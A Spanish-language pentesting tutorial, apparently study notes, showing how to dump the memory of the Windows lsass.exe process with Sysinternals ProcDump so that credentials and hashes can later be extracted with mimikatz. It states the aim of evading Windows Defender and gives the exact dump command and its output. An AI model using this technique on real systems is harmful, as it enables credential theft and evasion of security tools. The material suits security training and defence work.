# Procdump y lsass.exe

En esta parte vamos a ver algunas herramientas las cuales hacen el mismo funcionamiento que `mimikatz` pero sin ser detectado por el `Windows Defender` ya que `mimikatz` al ser una herramienta tan famosa, hay mas nivel de proteccion respecto a dicha herramienta.

Pero lo que podemos hacer es realizar un volcado de memoria de la maquina, y esto llevarlo a nuestro host, una vez estando en nuestro host, podremos utilizar `mimikatz` para extraer credenciales, `hashes`, etc...

El proceso que se encarga de gestionar el `logon` de los usuario en el sistema operativo, que administra estas contraseñas, estos `hashes`, etc... Es el proceso `lsass` por lo tanto vamos a intentar hacer un `dump` de la memoria que tiene este proceso que se esta ejecutando ahora mismo.

La herramienta que utilizaremos para esto sera la llamada `ProcDump` una herramienta oficial de `Windows`:

URL = [Documentacion de ProcDump](https://learn.microsoft.com/es-es/sysinternals/downloads/procdump)

URL = [Download ProcDump](https://download.sysinternals.com/files/Procdump.zip)

Abriremos un `cmd` como administrador (`Como si ya hubieramos comprometido la maquina siendo admins`) y nos iremos a la carpeta donde esta la herramienta `ProcDump`:

```cmd
cd C:\Users\user\Desktop\Procdump
```

Y ahora realizaremos el volcado del proceso `lsass.exe` de la siguiente forma:

```cmd
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```

Info:

```
ProcDump v11.0 - Sysinternals process dump utility
Copyright (C) 2009-2022 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[10:38:44] Dump 1 initiated: C:\Users\d1se0\Desktop\Procdump\lsass.dmp
[10:38:44] Dump 1 writing: Estimated dump file size is 57 MB.
[10:38:45] Dump 1 complete: 57 MB written in 0.7 seconds
[10:38:45] Dump count reached.
```

Y con esto ya nos habria generado el fichero `lsass.dmp` el cual nos tendremos que llevar a nuestro `kali` para utilizar `mimikatz`.
